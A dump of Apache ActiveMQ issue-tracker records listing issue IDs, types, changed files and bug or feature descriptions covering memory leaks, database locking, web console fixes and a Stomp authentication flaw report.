for thistype: 63268       at oracle.jdbc.dbaccess.DBError.throwSqlException(DBError.java:134)       at oracle.jdbc.dbaccess.DBError.throwSqlException(DBError.java:179)       at oracle.jdbc.ttc7.TTCItem.setArrayData(TTCItem.java:95)       atoracle.jdbc.dbaccess.DBDataSetImpl.setBytesBindItem(DBDataSetImpl.java:2413)       atoracle.jdbc.driver.OraclePreparedStatement.setItem(OraclePreparedStatement.java:1166)       atoracle.jdbc.driver.OraclePreparedStatement.setBytes(OraclePreparedStatement.java:2208)       atorg.apache.commons.dbcp.DelegatingPreparedStatement.setBytes(DelegatingPreparedStatement.java:105)       atorg.apache.commons.dbcp.DelegatingPreparedStatement.setBytes(DelegatingPreparedStatement.java:105)       atorg.apache.activemq.store.jdbc.adapter.DefaultJDBCAdapter.setBinaryData(DefaultJDBCAdapter.java:56)       atorg.apache.activemq.store.jdbc.adapter.DefaultJDBCAdapter.doAddMessage(DefaultJDBCAdapter.java:175)       atorg.apache.activemq.store.jdbc.JDBCMessageStore.addMessage(JDBCMessageStore.java:71)       ... 19 more&#8211;View this message in context: http://www.nabble.com/Data-size-bigger-than-max-size-for-this-type-tf3489299s2354.html#a9744357
issueID:AMQ-1218
type:Bug
changed files:
texts:activemq-ra pom.xml&#39;s xbean plugin missing version
Simple enough to fix...
issueID:AMQ-1223
type:Improvement
changed files:pom.xml
BrokerMojo.java
texts:Maven plugin could locate activemq-data directory in target dir
I"d like the Maven plugin to coerce the activemq-data directory to the build output (target) directory so that it will be deleted when doing a "clean".  Useful for integration tests where we don"t need the activemq-data directory to survive between broker  instantiations.The attached patch will cause the activemq-data directory to be located in the existing configured "outputDirectory", which defaults to "target".  This essentially changes the current behavior.
issueID:AMQ-1227
type:Improvement
changed files:WebClient.java
MessageServletSupport.java
MessageServlet.java
texts:ActiveMQ web component - proper handling of priority, timeToLive and delivery mode
Currently, web component does not handle priority, time to live and delivery mode properties when sending messages as it should. All messages are sent as  non-persistant, with time to expire set to 0 and priority 4.Submitted patch fixes some of the spotted problems. It checks for JMSPriority, JMSTimeToLIve and JMSDeliveryMode request parameters and acts according to their values. If they are not set it uses default values (priority =5, delivery mode = persistent, no expiry time).
issueID:AMQ-1229
type:Bug
changed files:FactoryFinder.java
texts:Thread.currentThread().getContextClassLoader() null in FactoryFinder.newInstance
org.apache.activemq.util.FactoryFinder.doFindFactoryProperies() correctly consults the current class"s loader if Thread.currentThread().getContextClassLoader() is null:        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();        if (classLoader == null) classLoader = getClass().getClassLoader();newInstance(), however, generates a null pointer exception if Thread.currentThread().getContextClassLoader() is null:        Class clazz;        try {            clazz = Thread.currentThread().getContextClassLoader().loadClass(className);        } catch (ClassNotFoundException e) {            clazz = FactoryFinder.class.getClassLoader().loadClass(className);        }
issueID:AMQ-1232
type:Wish
changed files:ActiveMQSession.java
texts:ActiveMQ bridging - and how to set JMSDestination on a message when sending
Hi, I"ve been trying to set up ActiveMQ 4.1.1 as a bridge over to Sun"s STC message broker used in the Sun CAPS Integration platform system.Got it to work with using the ConnectionFactory from CAPS and by specifying the following in the activemq.xml -file:  <bean id="remoteFactory"     class="com.stc.jms.client.STCQueueConnectionFactory">    <constructor-arg value="localhost"/>    <constructor-arg value="18007"/>  </bean>The connection works, but AMQ fails when trying to bridge message from CAPS to AMQ (the other direction works fine).The fail is materialized in a ClassCastException thrown from line 1505 in the class ActiveMQSession, in the statement:        message.setJMSDestination(destination);The actual message instance is inherited from Sun"s com.stc.jms.message.STCMessage, and the implementation of the setJMSDestination()-method here is doing a cast on the destination to a STCDestination, wich it really isn"t, and thus generating the Exception.My question however, is why this call to setJMSDestination is done on the original message? I see further down the AMQ send()-method that a new message is created (returned from ActiveMQMessageTransformation.transformMessage() on line 1524) and this is the one that really is sent. If setJMSDestination() is called on this message instead, it all works fine (since this is a "native" AMQ message).I"ve tried this out on my own local AMQ installation, just by replacing the ActiveMQSession- class in the origin jar-file (activemq-core-4.1.0-incubator.jar).The only change is to remove the line on 1505 as mentioned above, and instead call  msg.setJMSDestination(destination); somewhere below line 1524, after creating the new msg from the transformMessage()-call.This is a suggestion from my point-of-wiew, but maybe this approach will generate some kind of side-effects that I"m not aware of.Otherwise this relatively small change will (imho) make ActiveMQ be better suitable to bridge to other JMS-brokers.Regards-Alf
issueID:AMQ-1235
type:Bug
changed files:Scheduler.java
texts:Scheduler.cancel uses incorrect argument to shutdown threads
looking at the code from 4.1.1 in org.apache.activemq.thread.Scheduler, in the cancel method:the Runnable task argument is passed to clockDaemon.remove(). i think this is incorrect. ScheduledFuture ticket should be passed to clockDaemon.remove().the javadocs of ScheduledThreadPoolExecutor.remove discuss the possibility that Runnables might be stored in some other form internally, so calling remove with a plain Runnable might not do anything. I think the solution is to call remove with a ScheduledFuture, which is how they are stored internally in ScheduledThreadPoolExecutor.i came across this bug after upgrading to the java 5 version of backport-util-concurrent 3.0. that version makes more assumptions about the types that are passed into ScheduledThreadPoolExecutor.remove, so when you pass in a regular Runnable you"ll get a ClassCastException.this is trivial to fix, so i don"t think a patch is necessary. also i think this might address the memory leak mentioned in AMQ-1205
issueID:AMQ-1237
type:Improvement
changed files:
texts:WebConsole can&#39;t share the same security context as the ActiveMQ JAAS plugin
I configured my queue with jaas configuration and so with login.properties users and group properties files.When I open web console and browse the queue, the system give me this error:Error creating bean with name "queueBrowser" defined in ServletContext resource &#91;/WEB-INF/applicationContext.xml&#93;: Instantiation of bean failed; nested exception is org.springframework.beans.BeanInstantiationException: Could not instantiate bean class &#91;org.apache.activemq.web.QueueBrowseQuery&#93;: Constructor threw exception; nested exception is javax.jms.JMSException: User name or password is invalid.RequestURI=/admin/browse.jspCaused by:org.springframework.beans.factory.BeanCreationException: Error creating bean with name "queueBrowser" defined in ServletContext resource &#91;/WEB-INF/applicationContext.xml&#93;: Instantiation of bean failed; nested exception is org.springframework.beans.BeanInstantiationException: Could not instantiate bean class &#91;org.apache.activemq.web.QueueBrowseQuery&#93;: Constructor threw exception; nested exception is javax.jms.JMSException: User name or password is invalid.Caused by: org.springframework.beans.BeanInstantiationException: Could not instantiate bean class &#91;org.apache.activemq.web.QueueBrowseQuery&#93;: Constructor threw exception; nested exception is javax.jms.JMSException: User name or password is invalid.Caused by: javax.jms.JMSException: User name or password is invalid. at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:46) at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1207) at org.apache.activemq.ActiveMQConnection.ensureConnectionInfoSent(ActiveMQConnection.java:1289) at org.apache.activemq.ActiveMQConnection.start(ActiveMQConnection.java:463) at org.apache.activemq.web.SessionPool.getConnection(SessionPool.java:41) at org.apache.activemq.web.SessionPool.createSession(SessionPool.java:85) at org.apache.activemq.web.SessionPool.borrowSession(SessionPool.java:67) at org.apache.activemq.web.QueueBrowseQuery.(QueueBrowseQuery.java:41) at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:39) at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:27) at java.lang.reflect.Constructor.newInstance(Constructor.java:494) at org.springframework.beans.BeanUtils.instantiateClass(BeanUtils.java:82) at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:78) at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:156) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:683) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:621) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:380) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:264) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:156) at org.springframework.context.support.AbstractApplicationContext.getBean(AbstractApplicationContext.java:642) at org.apache.activemq.web.filter.ApplicationContextFilter$2.get(ApplicationContextFilter.java:157) at javax.el.MapELResolver.getValue(MapELResolver.java:164).....The web console not share Jaas Authetication configured in activemq.xml.
issueID:AMQ-1238
type:Improvement
changed files:
texts:start script fails on Debian sarge
the "uname -p" command fails on Debian sarge.  I"ll attach a patch which fixes this.
issueID:AMQ-1241
type:Improvement
changed files:
texts:Make WebConsole run as a standalone WAR
The WebConsole is a really nice thing, however you should be able to run it as a standalone war connecting to a remote broker (another vm or another server). This improves the following (IMO): stability of the broker itself as the web-console can f.e. eat up all available memory (try looking at a large queue) or do other bad things deployment (many companys have a standard deployment process for war-files as well as preconfigured application server to put them into) backward-compatibility (webconsole per se does not depend on a 4.2 broker, it runs just fine with 4.1 and 4.0) support for master-slave configurations with auto-failover (f.e. with a failover jmx syntax as well as the existing failover syntax for the jms connection)Related to this bug/improvement is the current mean behaviour of the web-console with non-default named brokers (sometimes using the web-console will end up in a second broker beeing started).
issueID:AMQ-1244
type:Bug
changed files:JDBCPersistenceAdapter.java
texts:DatabaseLocker implementation impedes database replication
The current implementation of the JDBC Master/Slave feature makes one broker (the master) acquire a lock on a database object. In Sybase, this has been implemented with the command:LOCK TABLE foo IN EXCLUSIVE MODEThis command can only be executed within a transaction, see:http://manuals.sybase.com/onlinebooks/group-as/asg1250e/sqlug/@Generic__BookTextView/54552;pt=54651This implies that for the whole lifespan of the ActiveMQ-process there is an open transaction in the RDBMS. This is a problem in a professional environment making use of a database replication server: The open transaction impedes that the transaction log in the active database is emptied, then the stable queue at the replication server won"t be purged and will steadily grow up to infinitum. We have been able to observe this behaviour.
issueID:AMQ-1245
type:Bug
changed files:
texts:Admin code has a minor bug - blank page in IE
need to add</script> to the end of main.jsp decorator in the admin app like this below, IE shows a blank page otherwise<SCRIPT type="text/javascript" src="/admin/js/common.js"/></script><script type="text/javascript" src="/admin/js/css.js"/></script><script type="text/javascript" src="/admin/js/standardista-table-sorting.js"/></script>
issueID:AMQ-1246
type:Bug
changed files:
texts:Sporatic ArrayOutOfBoundsException with Kaha persistence (in org.apache.activemq.kaha.impl.index.hash.HashPage.addHashEntry)
This error just started occurring after restarting activemq after its memory got fairly high (we"ve been running our app with this same ActiveMQ 4.2 build for several months without ever seeing this).  It"s happening on a persistent topic and doesn"t happen after each message is added to the topic but happens every 20 - 30 messages (the occurrence isn"t very consistent).java.lang.IndexOutOfBoundsException: Index: 25, Size: 22        at java.util.ArrayList.add(ArrayList.java:368)        at org.apache.activemq.kaha.impl.index.hash.HashPage.addHashEntry(HashPage.java:197)        at org.apache.activemq.kaha.impl.index.hash.HashPageInfo.addHashEntry(HashPageInfo.java:65)        at org.apache.activemq.kaha.impl.index.hash.HashBin.addHashEntry(HashBin.java:181)        at org.apache.activemq.kaha.impl.index.hash.HashBin.put(HashBin.java:144)        at org.apache.activemq.kaha.impl.index.hash.HashIndex.store(HashIndex.java:230)        at org.apache.activemq.kaha.impl.container.MapContainerImpl.place(MapContainerImpl.java:389)        at org.apache.activemq.store.kahadaptor.KahaTopicMessageStore.addMessage(KahaTopicMessageStore.java:62)        at org.apache.activemq.store.kahadaptor.KahaTransactionStore.addMessage(KahaTransactionStore.java:133)        at org.apache.activemq.store.kahadaptor.KahaTransactionStore$2.addMessage(KahaTransactionStore.java:68)        at org.apache.activemq.broker.region.Topic.doMessageSend(Topic.java:349)        at org.apache.activemq.broker.region.Topic.send(Topic.java:341)        at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:306)        at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:407)        at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:203)        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:127)        at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:97)        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:137)        at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:474)        at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:618)        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:282)        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:188)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:65)        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:133)        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:121)        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:137)        at java.lang.Thread.run(Thread.java:595)
issueID:AMQ-1250
type:Bug
changed files:TransportConnection.java
texts:4.2 Broker memory leak wrt rejected incoming connections
There"s another memory leak in the broker, which happens when the broker rejects a new connection attempt (say, when the broker thinks the current clientId already exists).  The problem is in org/apache/activemq/broker/TransportConnection::processAddConnection.  The line of code which calls broker.addConnection might throw an exception (i.e. if the clientId already exists), but the two HashMaps (brokerConnectionStates and localConnectionStates) have already been added to.  So, the exception is thrown and propagated back, but the two maps have not been emptied.To fix this, I put a try-catch around the broker.addConnection, and if there"s an exception, I remove the items from the two maps and then rethrow the exception.  Not sure if this is exactly the proper change - is there some other method that gets called in TransportConnection after the exception is thrown back?  I didn"t immediately find anything.So far, this change has been working for us.
issueID:AMQ-1251
type:Bug
changed files:
texts:Broker stops delivering messages to some consumers
I have around 40 consumers taking messages from a single queue. After awhile 1 or 2 consumers stop receiveing any messages. Going to JMX and stopping corresponding connection causes re-connect and messages are delivered again.I reproduced it twice in QA enviroment and now it happened in production. I tried to instrument the code and set the log in debug, but that changed timing and I failed to reproduce it after the changes.I suspect that runtime association b/w Queue and Consumer objects is lost on the Broker side. One of the suspects is the empty catch block in the RoundRobinDispatchPolicy (line 64) class. It is possible that the CopyOnWrite array list is messed up and it fails when removed consumer is added back. BTW CopyOnWrite list is good when you mostly read, but not so good when you write for every message delivery and empty catch blocks are bad in any case.if (firstMatchingConsumer != null) {      // Rotate the consumer list.      try {                consumers.remove(firstMatchingConsumer);                consumers.add(firstMatchingConsumer);      } catch (Throwable bestEffort) {      }}
issueID:AMQ-1253
type:Improvement
changed files:
texts:AMQ Should Print a Warning (Or Throw an Exception) If Messages Are Received to a Non-Started Connection
The following scenario can occur:(1) Create a javax.jms.Connection but don"t start it(2) Create a MessageConsumer on the Connection and subscribe to a Queue(3) Send messages to the QueueIn this case (turning on trace logging) the messages will be received by the Connection and they will silently be discarded. To the poor bloke who forgot to call Connection.start() it looks like the messages have simply disappeared and the universe is torturing him. He then must endure the horror of tracing through his code trying to find out why some cruel god is consuming his messages only to discover six hours later that he forgot to call Connection.start() and thus the punchline of the cruel joke that is his life is delivered and he"s prompted to thoughts of self destruction and spilling the blood innocents.To prevent this scenario it would be nice if AMQ printed a warning (or better yet threw an exception) indicating that activity is occurring on a Connection that has not been started. In this case the programmer could clearly see that he forgot to call Connection.start(), happily add the line and continue on into the brave future!
issueID:AMQ-1254
type:Bug
changed files:
texts:Kaha Store puts a non-string into System properties
KahaStore puts a hashmap into SystemProperties, which causes problems with programs that expect only strings as properties.  In particular some versions of Hibernate assume all system properties are strings: this is causing difficulties running roller in geronimo 2.0Attached is a proposed solution.  I have no idea how to test it.  I get the same 7 failures and one error building amq with and without the change.The proposal stores the list of locked directories in a string and converts it back and forth to a map whenever it is accessed.  I use a constant string as the vm-wide lock monitor formerly provided by the HashSet.  According to the String javadoc constant strings are intern()ed and the same instance is provided in any classloader: this makes it suitable for a vm-wide lock monitor.
issueID:AMQ-1255
type:Bug
changed files:
texts:Advisory queues don&#39;t disappear for TEMPORARY queues/topics
My ActiveMQ clients create TEMPORARY queues and I have been looking through the active queues recently and I noticed a number of advisory queues are sticking around (mostly ones that have ActiveMQ.Advisory.Producer.*) that refer to the temporary queues that I created. It seems that even though the temporary queues are gone the advisory topics are still there. Over time this looks like it degrades the performance of ActiveMQ.
issueID:AMQ-1260
type:Improvement
changed files:webconsole-properties.xml
RemoteJMXBrokerFacade.java
texts:web-console cannot connect to basic-auth JMX
The web console cannot connect to a JMX port that is protected by basic role/password auth when connecting to a remote server, since there"s no code to pass in or configure such credentials. The attached patch just allows for passing in a role name and password, and uses them when connecting.
issueID:AMQ-1261
type:Bug
changed files:QueueBrowseServlet.java
texts:IllegalStateException thrown from QueueBrowserServlet
I get this from the demo app when I go to the queue browser pages ...java.lang.IllegalStateException: missing ConnectionFactory in QueueBrowserServlet at org.apache.activemq.web.QueueBrowseServlet.getConnectionFactory(QueueBrowseServlet.java:75) at org.apache.activemq.web.QueueBrowseServlet.getConnection(QueueBrowseServlet.java:63) at org.apache.activemq.web.QueueBrowseServlet.createSession(QueueBrowseServlet.java:158) at org.apache.activemq.web.QueueBrowseServlet.borrowSession(QueueBrowseServlet.java:140) at org.apache.activemq.web.QueueBrowseServlet.doGet(QueueBrowseServlet.java:89) at javax.servlet.http.HttpServlet.service(HttpServlet.java:707) at javax.servlet.http.HttpServlet.service(HttpServlet.java:820) at org.mortbay.jetty.servlet.ServletHolder.handle(ServletHolder.java:467) at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1075) at org.apache.activemq.web.SessionFilter.doFilter(SessionFilter.java:47) at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1066) at org.mortbay.jetty.servlet.ServletHandler.handle(ServletHandler.java:365) at org.mortbay.jetty.security.SecurityHandler.handle(SecurityHandler.java:185) at org.mortbay.jetty.servlet.SessionHandler.handle(SessionHandler.java:181) at org.mortbay.jetty.handler.ContextHandler.handle(ContextHandler.java:715) at org.mortbay.jetty.webapp.WebAppContext.handle(WebAppContext.java:402) at org.mortbay.jetty.handler.HandlerCollection.handle(HandlerCollection.java:114) at org.mortbay.jetty.handler.HandlerWrapper.handle(HandlerWrapper.java:139) at org.mortbay.jetty.Server.handle(Server.java:285) at org.mortbay.jetty.HttpConnection.handleRequest(HttpConnection.java:469) at org.mortbay.jetty.HttpConnection$RequestHandler.headerComplete(HttpConnection.java:791) at org.mortbay.jetty.HttpParser.parseNext(HttpParser.java:500) at org.mortbay.jetty.HttpParser.parseAvailable(HttpParser.java:209) at org.mortbay.jetty.HttpConnection.handle(HttpConnection.java:358) at org.mortbay.io.nio.SelectChannelEndPoint.run(SelectChannelEndPoint.java:365) at org.mortbay.thread.BoundedThreadPool$PoolThread.run(BoundedThreadPool.java:442)
issueID:AMQ-1263
type:Bug
changed files:DefaultDatabaseLocker.java
texts:JDBC Master/Slave: After database failure, stale db connections are reused in DefaultdatabaseLocker
Start two brokers in a JDBC master/slave configuration.  One will become master, the other slave.Shutdown the database.The slave will immediately begin emitting emitting database connection exceptions messages from the DefaultdatabaseLocker.Bring up the database again.The slave continues to emit database error messages and all subsequent attempts by the DefaultdatabaseLocker to issue its locking query will fail.The problem is that the DefaultdatabaseLocker grabs one db connection at startup and never releases it.  Therefore unless the JDBC connection has an auto-reconnect feature, the slave broker is dead in the water, because its Connection is bad.  The fix is to allocate a new Connection and PreparedStatement on every iteration of the database locker loop, and free the statement/connection on any Exception.
issueID:AMQ-1268
type:Test
changed files:
texts:MarshallingBrokerTest.testQueueBrowserWith2Consumers() regression
Looks like the queue browser has changed in trunk.  It now seems to not give you message that have been dispatched to another consumer but not  yet acked.
issueID:AMQ-1269
type:Test
changed files:
texts:MessageExpirationTest..testMessagesInLongTransactionExpire() Persistent Message to Queue Regressoin.
Test case has started failing.  Probably due to the new cursor based persistence model implemented in trunk.  Commenting out the test peristent combination for now.
issueID:AMQ-1270
type:Improvement
changed files:MessageListenerServlet.java
texts:Specify destination in responses from MessageListenerServlet
harmless patch to put destination name in the demo app message responses - also looks to HTTP header for the destination if the destination name is not found in POST parametersboth of these make it much easier to build a REST integration demo using other frameworks ( http://code.google.com/p/activemessaging/wiki/ActiveMessaging )
issueID:AMQ-1272
type:Bug
changed files:
texts:Stomp protocol does not correctly check authentication (security hole)
ActiveMQ does not correctly validate the username and password of Stomp clients.  A security exception is generated, but ignored, leaving the client connected, and with full and unrestricted access to ActiveMQ.Further description, and a partial patch:http://www.nabble.com/Getting-Stomp-support-to-a-usable-state...-tf3858629s2354.html#a11060452 BTW, while the patch in the above post, is crude, however, leaving unauthenticated users connected with full-access makes ActiveMQ and Stomp pretty unusable.  So please apply the path, rather than do nothing.
issueID:AMQ-1274
type:Bug
changed files:
texts:Service Wrapper Installer does not work when ActiveMQ is installed on path that contains a spaces
If Active MQ is installed in a directory that contains spaces (i.e. E:Program Filesapache-activemq-4.2-SNAPSHOT) the win32 service wrapper installer does not work.Just need to add quotes around path variables in binwin32wrapper.conf
issueID:AMQ-1279
type:Bug
changed files:AbstractRegion.java
texts:Unused import sun.security.x509.IssuerAlternativeNameExtension prevents using IBM JDK for building ActiveMQ
Unused import sun.security.x509.IssuerAlternativeNameExtension in org.apache.activemq.broker.region.AbstractRegion.java prevents using IBM JDK 1.5.0 for building ActiveMQ.  Is there any reason to retain this unused import?
issueID:AMQ-1281
type:Improvement
changed files:
texts:Better WAR building for the WebConsole
The webconsole can be deployed in any webcontainer and is also started by default within the broker. However the building and configuration process is unclear. To resolve that issue I added some documentation about how to run the war in an external servlet container and changed some default setting. Also I changed the version that is started within the broker to the invm version instead of the "custom" configuration that was previously included in the assembly/src/release/webapp/WEB-INF. The maven jetty:run on the web-console project will still start up the embedded version, but I fixed the bug that caused it to leak sessions (switched to the spring-2.0 syntax for the configuration file). I removed some JARs from the WEB-INF/lib of the war because they should be provided by the servlet container. This affects some specifications (JMX, JMS), the activation-jar and, most important, the activemq-core jar.I hope this does the job and makes the deployment experience for the users easier.Note: I had some problems putting together the patch as my subversion (or my inability to communicate with it) insisted on leaving out some files I created  I think they"re all in now, but I"m not sure. So if anything is missing...
issueID:AMQ-1282
type:Bug
changed files:
texts:Bad conversion of nonexistent data in MapMessage
Consider simple reception code like this:        MapMessage message = (MapMessage) consumer.receive(1000);        int x = message.getInt("foo"));I notice that x is now set to zero even though there was no "foo" value in the map. I would have expected an exception.According to Gaurav Hariani <gaurav@blackspark.com>  also from the spec api: http://java.sun.com/j2ee/1.4/docs/api/javax/jms/MapMessage.html    Attempting to read a null value as a primitive type must be treated as calling the primitive"s corresponding valueOf(String) conversion method with a null value. Since char does not support a String conversion, attempting to read a null value as a char must throw a NullPointerException... so you are right that it is a bug ... since Integer.valueOf(null) throws an Exception
issueID:AMQ-1284
type:Bug
changed files:RemoveSubscriptionInfo.java
texts:RemoveSubscriptionInfo has incorrect openwire annotation in its header
The RemoveSubscriptionInfo Openwire command has the wrong annotation in its header for the type of openwire command.Currently its@openwire:marshaller command="9"Should be:@openwire:marshaller code="9"This affects the clients that have commands generated using the openwire generator as they send in a command with an invalid command ID.
issueID:AMQ-1292
type:Bug
changed files:MessageServletSupport.java
texts:MessageServletSupport does not compile
commit for 549845 took out the logger imports but it left the logger
issueID:AMQ-1293
type:Bug
changed files:
texts:Fix FindBugs issues
FindBugs 1.2.1 find various issues in the ActiveMQ code that look like they need some attention. While we sort out FindBugs in the Maven build, using the Eclipse plugin for FindBugs is a quick way to get going:http://findbugs.sourceforge.net/downloads.htmlI"m attaching a first patch that addresses some basic issues.The other major the FindBugs points out is "inconsistent synchronization" in various cursor and Kaha and other org.apache.activemq.store classes.
issueID:AMQ-1294
type:Bug
changed files:BrokerService.java
texts:Kaha can&#39;t be completely disabled in activemq-5.0
Kaha can"t be completely disabled in activemq-5.0-20070621.With this config: <persistenceAdapter>        <journaledJDBC journalLogFiles="5" dataDirectory="${activemq.base}/activemq-data"/> </persistenceAdapter>ActiveMQ should just use JDBC/Derby+Journal, as soon as the first consumer gets a message, ActiveMQ logs this:INFO  KahaStore                      - Kaha Store successfully deleted data directory activemq-data/localhost/tmp_storageINFO  BrokerService                  - Successfully deleted temporary storageSo ActiveMQ is trying to delete temporary files belong to a persistence engine that isn"t used.It seems odd that Kaha purges temporary files during consumer startup, rather than ActiveMQ startup when Kaha would normally (if I was using it), be recovering/checking its database.
issueID:AMQ-1299
type:New Feature
changed files:NetworkConnector.java
NetworkBridge.java
DemandForwardingBridgeSupport.java
NetworkConnectorViewMBean.java
BrokerService.java
NetworkConnectorView.java
NetworkBridgeViewMBean.java
NetworkBridgeListener.java
ForwardingBridge.java
NetworkBridgeView.java
DiscoveryNetworkConnector.java
NetworkBridgeFactory.java
NetworkBridgeFailedListener.java
texts:Display the establised Neteowork Connector Bridges via JMX
None
issueID:AMQ-1305
type:Bug
changed files:SubscriptionInfo.java
KahaReferenceStoreAdapter.java
InactiveDurableSubscriptionView.java
TopicRegion.java
RemoveSubscriptionInfo.java
SubscriptionKey.java
texts:spelling error
Near the bottom of the page at http://activemq.apache.org/stomp.html activemq.subcriptionName should be activemq.subscriptionName
issueID:AMQ-1306
type:Bug
changed files:CommandShellOutputFormatter.java
texts:Remove reference to LogicBlaze from ActiveMQ --version command
Running bin/activemq --version renders the following output: ACTIVEMQ_HOME: /Users/bsnyder/apache-activemq-4.1.1ACTIVEMQ_BASE: /Users/bsnyder/apache-activemq-4.1.1ActiveMQ 4.1.1For help or more information please see: http://www.logicblaze.com Attached is a patch that changes the output to the following:  ACTIVEMQ_HOME: /Users/bsnyder/apache-activemq-4.1.1ACTIVEMQ_BASE: /Users/bsnyder/apache-activemq-4.1.1ActiveMQ 4.1.1For help or more information please see: http://activemq.apache.org/
issueID:AMQ-1307
type:New Feature
changed files:
texts:add Camel support in the activemq.xml file to show folks how to easily enable camel routes...
Then folks can easily implement EIP patterns in the ActiveMQ broker...
issueID:AMQ-1308
type:Bug
changed files:TextWireFormat.java
HttpTunnelServlet.java
texts:Messages delivered from HttpTunnelServlet connected broker are limited to 64K bytes.
In TextWireFormat.java: the methods writeUTF/readUTF are used in the code path to deliver messages from an HTTP connected broker.    public void marshal(Object command, DataOutput out) throws IOException {        out.writeUTF(marshalText(command));    }    public Object unmarshal(DataInput in) throws IOException {        String text = in.readUTF();        return unmarshalText(text); }These methods limit the max message size to 64K. Messages sent to an HTTP connected broker do not have the same limitation.Problem first reported in activemq-users with the subject "UTFDataFormatException in broker when using a http transportConnector".THanks,Eddie
issueID:AMQ-1311
type:Improvement
changed files:BrokerView.java
BrokerViewMBean.java
texts:Expose brokerName via BrokerViewMBean
Please expose the Broker"s brokerName property via the BrokerViewMBean interface.
issueID:AMQ-1314
type:Improvement
changed files:AbstractCommand.java
texts:Invalid Command Line Option Handling
If the "activemq" command is given an invalid option, it will put  out an INFO message stating that the option is invalid and thus is being ignored; however, the command will still go ahead and start the broker.I"d like to propose that, when given an invalid option, "activemq" instead put out an Error message with accompanying USAGE string and not start the broker.
issueID:AMQ-1315
type:Bug
changed files:RssMessageRenderer.java
queues.jsp
QueueBrowseServlet.java
texts:RSS/Atom Feed does not work in the WebConsole
The links for the rss and atom view of the queues (in queues.jsp) are broken. They render an error page (something like could not create connection factory).
issueID:AMQ-1318
type:Improvement
changed files:
texts:the apache-activemq.jar currently has millions of dependencies (as the assembly pom.xml has loads of dependencies to make the distribution). We need to split up making the uber-jar into another project
So lets have an "activemq-all.jar" or something like that - which creates a similar activemq-all.jar as the assembly, but such that its pom only depends on the actual dependencies required to use it - rather than the dependencies of the assembly/pom.xml which is large.So the uber-jar should include all those ActiveMQ libraries required (though not including derby as we no longer require that by default, ditto no need for activeio).
issueID:AMQ-1323
type:Bug
changed files:
texts:StompSubscriptionRemoveTest hangs
StompSubscriptionRemoveTest hangs on windows in a native write so one can never do a mvn install.The cause is that the message-id is not properly retrieved from the message and the queue name is sent back as message id in acks and hell breaks loose from there.
issueID:AMQ-1324
type:Improvement
changed files:pom.xml
activemq.xml
RemoteJMXBrokerFacade.java
texts:Allow to view connections and consumers in the WebConsole
This patch enables viewing of open connections and active consumers on queues in the activemq web-console.It also contains a minor fix enabling the use of password protected connections to remote brokers.
issueID:AMQ-1326
type:Improvement
changed files:DestinationFacade.java
texts:Move/Copy feature for web console
I"ve added message copy and move funcionality to the web console. For now it is only applied to the message.jsp page, since I think it is not a good fit the browse page interface (we can add some bulk copy/move messages operations later). I"m not sure what"s your opinion on JS confirmation dialogs, but I generally think we should have some kind of user confirmation for operations such as delete, copy, move, etc (queues, topics, messages, ...) . I"ve added some JS code for these new operations and would provide additional confirmations for existing operations if it is OK with you. I"ve put all JS code in the common.js as it seemed the most appropriate place for it (maybe we could create a new file for this kind of JS code, but I think it is not necessary).While working on this, I found a potential problem in activemq-core module. A patch for it is also attached to this issue. The bug scenario is as follows:1. create two queues2. send text message using the web console3. try to copy/move the message the null pointer exception is thrown.the same code used to copy the message in a test case works fine.After investigating a bit, I found that problem is caused by the fact that message sent through web console has responseRequired property set to false and it is tried to be dispatched asynchronously using the context without a valid connection. I saw the code similar to the problematic is used elsewhere in the Queue.java class but only for expired messages, so I"ve added an additional condition. I"m not sure if it is valid patch, but it solved this particular problem. It would be good if someone could investigate this further.
issueID:AMQ-1335
type:Improvement
changed files:
texts:Exclusive consumers are now selected up front when the consumer gets registered.
None
issueID:AMQ-1337
type:Improvement
changed files:
texts:Broker should finish accepting connection in an async thread.
Start the broker connection in an async thread since wire format negociation on 1 client could block the server from accepting other connections
issueID:AMQ-1339
type:Improvement
changed files:TransportConnection.java
texts:Give the connection dispatcher threads names that are easy to associate with the peer.
None
issueID:AMQ-1340
type:Bug
changed files:TransportConnector.java
DedicatedTaskRunner.java
texts:Thread gets stuck in a WAIT and never returns
